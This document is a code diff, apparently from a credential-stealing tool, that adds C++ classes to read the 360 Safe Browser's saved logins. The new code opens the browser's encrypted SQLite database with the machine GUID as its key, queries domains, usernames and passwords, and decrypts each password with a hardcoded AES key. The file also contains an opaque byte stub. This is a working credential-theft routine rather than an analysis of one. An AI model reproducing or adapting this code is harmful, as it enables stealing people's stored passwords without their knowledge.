@@ -8,10 +8,14 @@
 
 #include <memory>
 #include <string>
+#include <vector>
 #include <codecvt>
 #include <Windows.h>
 #include "CipherHelper.h"
+#include "sqlite3.h"
 
+
+#pragma comment(lib, "libsqlite3.lib")
 
 typedef unsigned __int64 QWORD;
 
@@ -26,6 +30,8 @@ static BYTE stub[] = {
 			0xc8, 0x0f, 0x85, 0x3b, 0x97, 0x03, 0x00, 0x8b, 0x45, 0xd8, 0x8b, 0x4d, 0xfc, 0x5f, 0x5e, 0x33,
 			0x10, 0x00, 0x00, 0x00, 0x57, 0x00, 0x44, 0x00, 0x4c, 0x00, 0x32, 0x00, 0x30, 0x00, 0x31, 0x00,
 			0x36, 0x00, 0x00, 0x00 };
+
+static const char aes_key[] = { 0x63, 0x66, 0x36, 0x36, 0x66, 0x62, 0x35, 0x38, 0x66, 0x35, 0x63, 0x61, 0x33, 0x34, 0x38, 0x35 };
 
 class SafeBrowserBookMark {
 
@@ -562,4 +568,125 @@ private:
 
 		char* m_memoryBuffer;
 		DWORD m_dwMemoryBuffer;
+};
+
+/*
+* 360 auto save file
+* user data stored at
+* C:/Users/Administrator/AppData/Roaming/360se6/User Data/Default/apps/LoginAssis/assis2.db
+* This is encrypted db
+* which key is Machine GUID from Regs [\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography]
+*/
+class Wrapper {
+public:
+	Wrapper() {}
+
+	Wrapper(std::string domain, std::string account, std::string enc_password){
+		this->m_domain = domain;
+		this->m_account = account;
+		this->enc_password = enc_password;
+	}
+
+	~Wrapper() {}
+private:
+	std::string m_domain;
+	std::string m_account;
+	std::string enc_password;
+};
+
+class SafeBrowserAutoSave {
+
+public:
+	
+	bool Init(LPWSTR dbfilePath, std::string guid, std::vector<Wrapper>& res) {
+		if (dbfilePath == NULL) {
+			return false;
+		}
+		if (guid == "") {
+			return false;
+		}
+		m_guid = guid;
+		sqlite3* db = NULL;
+		int status = SQLITE_OK;
+		do {
+			status = sqlite3_open16(dbfilePath, &db);
+			if (status != SQLITE_OK) {
+				break;
+			}
+			status = sqlite3_key(db, m_guid.c_str(), m_guid.size());
+			if (status != SQLITE_OK) {
+				break;
+			}
+			// select domain, username, password from tb_account;
+			sqlite3_stmt* stat = NULL;
+			const wchar_t* szSql = L"select domain, username, password from tb_account;";
+			status = sqlite3_prepare16(db, szSql, lstrlenW(szSql) * 2, &stat, 0);
+			if (status != SQLITE_OK) {
+				break;
+			}
+			while (SQLITE_ROW == sqlite3_step(stat)) {
+				std::string urls = std::string((const char*)sqlite3_column_text(stat, 0));
+				std::string name = std::string((const char*)sqlite3_column_text(stat, 1));
+				std::string password = std::string((const char*)sqlite3_column_text(stat, 2));
+				password = DecryptPassword(password);
+				res.push_back(Wrapper(urls, name, password));
+			}
+			
+		} while (false);
+		 return status == SQLITE_OK;
+	}
+	
+	void Uint() {
+		m_dbPath = L"";
+		m_guid = "";
+	}
+	
+	static void GetInfoFromSQL(LPWSTR dbfilePath, std::string guid, std::vector<Wrapper>&res) {
+		SafeBrowserAutoSave autoSave;
+		autoSave.Init(dbfilePath, guid, res);
+		autoSave.Uint();
+	}
+
+	SafeBrowserAutoSave() = default;
+	
+	~SafeBrowserAutoSave() {
+		Uint();
+	}
+	
+private:
+
+	std::string DecryptPassword(std::string encPsw) {
+		int size = encPsw.size() - 14;
+		if (size <= 0) {
+			return "";
+		}
+		std::string decodePassword = SSLHelper::Base64Decode(encPsw.substr(14), size);
+		// AES-ECB-128
+		std::string buffer = SSLHelper::AesECBDecrypt(decodePassword, size, aes_key, 16);
+		std::string tempstr = "";
+
+		if (buffer[0] == '\x01') {
+			for (int j = 2; j < buffer.size(); j += 1) {
+				if (j % 2 != 1)
+					tempstr.append(1, buffer[j]);
+				else
+					continue;
+			}
+		}
+
+		if (buffer[0] == '\x02') {
+			for (int j = 1; j < buffer.size(); j += 1) {
+				if (j % 2 == 1)
+					tempstr.append(1, buffer[j]);
+				else
+					continue;
+			}
+		}
+
+		return tempstr;
+	}	
+
+private:
+	std::wstring m_dbPath;
+	std::string m_guid;
 };
